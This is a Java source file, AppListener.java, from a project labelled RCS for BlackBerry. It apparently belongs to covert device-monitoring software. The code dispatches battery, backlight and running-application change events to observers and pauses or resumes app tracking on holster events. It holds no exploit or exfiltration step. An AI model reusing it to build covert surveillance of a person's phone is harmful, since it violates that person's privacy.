//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry
 * File         : AppListener.java
 * Created      : 28-apr-2010
 * *************************************************/

package blackberry;

import java.util.Vector;

import net.rim.device.api.system.DeviceInfo;
import net.rim.device.api.system.HolsterListener;
import net.rim.device.api.system.RadioStatusListener;
import net.rim.device.api.system.SystemListener;
import net.rim.device.api.system.SystemListener2;
import blackberry.interfaces.ApplicationListObserver;
import blackberry.interfaces.BacklightObserver;
import blackberry.interfaces.BatteryStatusObserver;
import blackberry.interfaces.Singleton;
import blackberry.utils.Check;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

// TODO: Auto-generated Javadoc
/**
 * The listener interface for receiving app events. The class that is interested
 * in processing a app event implements this interface, and the object created
 * with that class is registered with a component using the component's
 * <code>addAppListener<code> method. When
 * the app event occurs, that object's appropriate
 * method is invoked.
 * 
 * @see AppEvent
 */
public final class AppListener implements RadioStatusListener, HolsterListener,
        SystemListener, SystemListener2, Singleton {

    //#ifdef DEBUG
    static Debug debug = new Debug("AppListener", DebugLevel.VERBOSE);

    //#endif

    static private int lastStatus;
    Vector batteryStatusObservers = new Vector();
    Vector applicationListObservers = new Vector();
    Vector backlightObservers = new Vector();

    Task task;

    //private Timer applicationTimer;

    static AppListener instance;

    /**
     * Instantiates a new app listener.
     */
    private AppListener() {
        lastStatus = DeviceInfo.getBatteryStatus();
        task = Task.getInstance();
    }

    /**
     * Gets the single instance of AppListener.
     * 
     * @return single instance of AppListener
     */
    public synchronized static AppListener getInstance() {
        if (instance == null) {
            instance = new AppListener();
        }
        return instance;
    }

    /**
     * Adds the battery status observer.
     * 
     * @param observer
     *            the observer
     */
    public synchronized void addBatteryStatusObserver(
            final BatteryStatusObserver observer) {

        //#ifdef DBC
        Check.requires(!batteryStatusObservers.contains(observer),
                "already observing");
        //#endif

        //#ifdef DEBUG_TRACE
        debug.trace("adding observer: " + observer);

        //#endif
        batteryStatusObservers.addElement(observer);
    }

    /**
     * Adds the application list observer.
     * 
     * @param observer
     *            the observer
     */
    public synchronized void addApplicationListObserver(
            final ApplicationListObserver observer) {

        //#ifdef DBC
        Check.requires(!applicationListObservers.contains(observer),
                "already observing");
        //#endif

        //#ifdef DEBUG_TRACE
        debug.trace("adding observer: " + observer);

        //#endif
        applicationListObservers.addElement(observer);
    }

    public synchronized void addBacklightObserver(
            final BacklightObserver observer) {

        //#ifdef DBC
        Check.requires(!backlightObservers.contains(observer),
                "already observing");
        //#endif

        //#ifdef DEBUG_TRACE
        debug.trace("adding observer: " + observer);

        //#endif
        backlightObservers.addElement(observer);
    }
    
    /**
     * Removes the battery status observer.
     * 
     * @param observer
     *            the observer
     */
    public synchronized void removeBatteryStatusObserver(
            final BatteryStatusObserver observer) {
        //#ifdef DEBUG_TRACE
        debug.trace("removing observer: " + observer);
        //#endif

        if (batteryStatusObservers.contains(observer)) {
            batteryStatusObservers.removeElement(observer);
        } else {
            //#ifdef DEBUG
            debug.error("removing observer not present: " + observer);
            //#endif
        }
    }

    /**
     * Removes the application list observer.
     * 
     * @param observer
     *            the observer
     */
    public synchronized void removeApplicationListObserver(
            final ApplicationListObserver observer) {
        //#ifdef DEBUG_TRACE
        debug.trace("removing observer: " + observer);
        //#endif

        if (applicationListObservers.contains(observer)) {
            applicationListObservers.removeElement(observer);
        } else {
            //#ifdef DEBUG
            debug.error("removing observer not present: " + observer);
            //#endif
        }
    }
    
    public synchronized void removeBacklightObserver(
            final BacklightObserver observer) {

        //#ifdef DEBUG_TRACE
        debug.trace("removing observer: " + observer);
        //#endif

        if (backlightObservers.contains(observer)) {
            backlightObservers.removeElement(observer);
        } else {
            //#ifdef DEBUG
            debug.error("removing observer not present: " + observer);
            //#endif
        }
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.RadioStatusListener#baseStationChange()
     */
    public void baseStationChange() {
        //#ifdef DEBUG_INFO
        debug.info("baseStationChange");
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener#batteryGood()
     */
    public void batteryGood() {
        //#ifdef DEBUG_INFO
        debug.info("batteryGood");
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener#batteryLow()
     */
    public void batteryLow() {
        //#ifdef DEBUG_INFO
        debug.info("batteryLow");
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener#batteryStatusChange(int)
     */
    public synchronized void batteryStatusChange(final int status) {
        //#ifdef DEBUG_INFO
        debug.info("batteryStatusChange arg: " + status);
        //#endif

        final int diff = (status ^ lastStatus);

        int size = batteryStatusObservers.size();
        for (int i = 0; i < size; i++) {

            BatteryStatusObserver observer = (BatteryStatusObserver) batteryStatusObservers
                    .elementAt(i);
            //#ifdef DEBUG_TRACE
            debug.trace("notify: " + observer);
            //#endif

            observer.onBatteryStatusChange(status, diff);
        }

        lastStatus = status;
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener#batteryStatusChange(int)
     */
    /**
     * Application list change.
     * 
     * @param startedList
     *            the started list
     * @param stoppedList
     *            the stopped list
     * @param stoppedListMod
     * @param startedListMod
     */
    public synchronized void applicationListChange(final Vector startedListName,
            final Vector stoppedListName, final Vector startedListMod,
            final Vector stoppedListMod) {
        //#ifdef DEBUG_INFO
        debug.info("applicationListChange start: " + startedListName.size() + " stopped: " + stoppedListName.size());
        //#endif

        //#ifdef DBC
        Check.requires(startedListName.size() == startedListMod.size(),
                "applicationListChange");
        Check.requires(stoppedListName.size() == stoppedListMod.size(),
                "applicationListChange");
        //#endif

        int size = applicationListObservers.size();
        for (int i = 0; i < size; i++) {

            ApplicationListObserver observer = (ApplicationListObserver) applicationListObservers
                    .elementAt(i);
            //#ifdef DEBUG_TRACE
            debug.trace("notify: " + observer);
            //#endif

            observer.onApplicationListChange(startedListName, stoppedListName,
                    startedListMod, stoppedListMod);
        }
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.HolsterListener#inHolster()
     */
    public void inHolster() {
        //#ifdef DEBUG_INFO
        debug.info("inHolster");
        //#endif

        // interrompe l'analisi degli applicativi
        task.stopApplicationTimer();
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.HolsterListener#outOfHolster()
     */
    public void outOfHolster() {
        //#ifdef DEBUG_INFO
        debug.info("outOfHolster");
        //#endif

        // riprende l'analisi degli applicativi
        // se c'e' una variazione nella lista comunica la lista agli observer
        // viene fatto con un timer
        task.startApplicationTimer();
    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.device.api.system.RadioStatusListener#networkScanComplete(boolean
     * )
     */
    public void networkScanComplete(final boolean success) {
        //#ifdef DEBUG_INFO
        debug.info("networkScanComplete success: " + success);
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.device.api.system.RadioStatusListener#networkServiceChange(int,
     * int)
     */
    public void networkServiceChange(final int networkId, final int service) {
        //#ifdef DEBUG_INFO
        debug.info("networkServiceChange networkId: " + networkId + " service : " + service);
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.RadioStatusListener#networkStarted(int,
     * int)
     */
    public void networkStarted(final int networkId, final int service) {
        //#ifdef DEBUG_INFO
        debug.info("networkStarted networkId: " + networkId + " service : "+ service);
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.device.api.system.RadioStatusListener#networkStateChange(int)
     */
    public void networkStateChange(final int state) {
        //#ifdef DEBUG_INFO
        debug.info("networkStateChange state: " + state);
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.RadioStatusListener#pdpStateChange(int,
     * int, int)
     */
    public void pdpStateChange(final int apn, final int state, final int cause) {
        //#ifdef DEBUG_INFO
        debug.info("pdpStateChange apn: " + apn + " state: " + state + "cause :" + cause);
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener#powerOff()
     */
    public void powerOff() {
        //#ifdef DEBUG_INFO
        debug.info("powerOff");
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener#powerUp()
     */
    public void powerUp() {
        //#ifdef DEBUG_INFO
        debug.info("powerUp");
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.RadioStatusListener#radioTurnedOff()
     */
    public void radioTurnedOff() {
        //#ifdef DEBUG_INFO
        debug.info("radioTurnedOff");
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.RadioStatusListener#signalLevel(int)
     */
    public void signalLevel(final int level) {
        //#ifdef DEBUG_INFO
        debug.info("signalLevel: " + level);
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.device.api.system.SystemListener2#backlightStateChange(boolean)
     */
    public void backlightStateChange(final boolean on) {
        //#ifdef DEBUG_INFO
        debug.info("backlightStateChange: " + on);
        //#endif

        int size = backlightObservers.size();
        for (int i = 0; i < size; i++) {

            BacklightObserver observer = (BacklightObserver) backlightObservers
                    .elementAt(i);
            //#ifdef DEBUG_TRACE
            debug.trace("notify: " + observer);
            //#endif

            observer.onBacklightChange(on);
        }

    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener2#cradleMismatch(boolean)
     */
    public void cradleMismatch(final boolean mismatch) {
        //#ifdef DEBUG_INFO
        debug.info("cradleMismatch: " + mismatch);
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener2#fastReset()
     */
    public void fastReset() {
        //#ifdef DEBUG_INFO
        debug.info("fastReset");
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener2#powerOffRequested(int)
     */
    public void powerOffRequested(final int reason) {
        //#ifdef DEBUG_INFO
        debug.info("powerOffRequested: " + reason);
        //#endif

    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.device.api.system.SystemListener2#usbConnectionStateChange(int)
     */
    public void usbConnectionStateChange(int state) {
        //#ifdef DEBUG_INFO
        debug.info("usbConnectionStateChange: " + state);
        //#endif
    }

}
